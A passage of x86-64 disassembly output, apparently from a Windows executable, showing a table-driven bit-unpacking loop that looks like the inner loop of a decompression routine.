   140004e27:	83 f9 40             	cmp    $0x40,%ecx
   140004e2a:	0f 47 c8             	cmova  %eax,%ecx
   140004e2d:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   140004e31:	4c 8b 7d f8          	mov    -0x8(%rbp),%r15
   140004e35:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   140004e39:	49 8d 7f f9          	lea    -0x7(%r15),%rdi
   140004e3d:	e8 7e c4 ff ff       	call   0x1400012c0
   140004e42:	33 c9                	xor    %ecx,%ecx
   140004e44:	85 c0                	test   %eax,%eax
   140004e46:	0f 94 c1             	sete   %cl
   140004e49:	33 c0                	xor    %eax,%eax
   140004e4b:	48 3b f7             	cmp    %rdi,%rsi
   140004e4e:	0f 92 c0             	setb   %al
   140004e51:	85 c8                	test   %ecx,%eax
   140004e53:	0f 84 f4 00 00 00    	je     0x140004f4d
   140004e59:	45 8b f5             	mov    %r13d,%r14d
   140004e5c:	41 8b fc             	mov    %r12d,%edi
   140004e5f:	45 2b f4             	sub    %r12d,%r14d
   140004e62:	f7 df                	neg    %edi
   140004e64:	41 ff c6             	inc    %r14d
   140004e67:	83 e7 3f             	and    $0x3f,%edi
   140004e6a:	41 83 e6 3f          	and    $0x3f,%r14d
   140004e6e:	49 83 c7 f9          	add    $0xfffffffffffffff9,%r15
   140004e72:	0f 1f 40 00          	nopl   0x0(%rax)
   140004e76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004e7d:	00 00 00 
   140004e80:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   140004e83:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140004e87:	48 d3 e2             	shl    %cl,%rdx
   140004e8a:	41 8b ce             	mov    %r14d,%ecx
   140004e8d:	48 d3 ea             	shr    %cl,%rdx
   140004e90:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004e95:	66 89 06             	mov    %ax,(%rsi)
   140004e98:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004e9d:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   140004ea3:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   140004ea6:	4c 03 c6             	add    %rsi,%r8
   140004ea9:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140004ead:	03 c8                	add    %eax,%ecx
   140004eaf:	48 d3 e2             	shl    %cl,%rdx
   140004eb2:	89 4d a0             	mov    %ecx,-0x60(%rbp)
   140004eb5:	8b cf                	mov    %edi,%ecx
   140004eb7:	48 d3 ea             	shr    %cl,%rdx
   140004eba:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004ebf:	66 41 89 00          	mov    %ax,(%r8)
   140004ec3:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004ec8:	44 0f b6 4c 93 07    	movzbl 0x7(%rbx,%rdx,4),%r9d
   140004ece:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   140004ed1:	4d 03 c8             	add    %r8,%r9
   140004ed4:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140004ed8:	03 c8                	add    %eax,%ecx
   140004eda:	48 d3 e2             	shl    %cl,%rdx
   140004edd:	89 4d a0             	mov    %ecx,-0x60(%rbp)
   140004ee0:	8b cf                	mov    %edi,%ecx
   140004ee2:	48 d3 ea             	shr    %cl,%rdx
   140004ee5:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004eea:	66 41 89 01          	mov    %ax,(%r9)
   140004eee:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004ef3:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   140004ef6:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   140004efc:	03 c8                	add    %eax,%ecx
   140004efe:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140004f02:	4d 03 c1             	add    %r9,%r8
   140004f05:	89 4d a0             	mov    %ecx,-0x60(%rbp)
   140004f08:	48 d3 e2             	shl    %cl,%rdx
   140004f0b:	8b cf                	mov    %edi,%ecx
   140004f0d:	48 d3 ea             	shr    %cl,%rdx
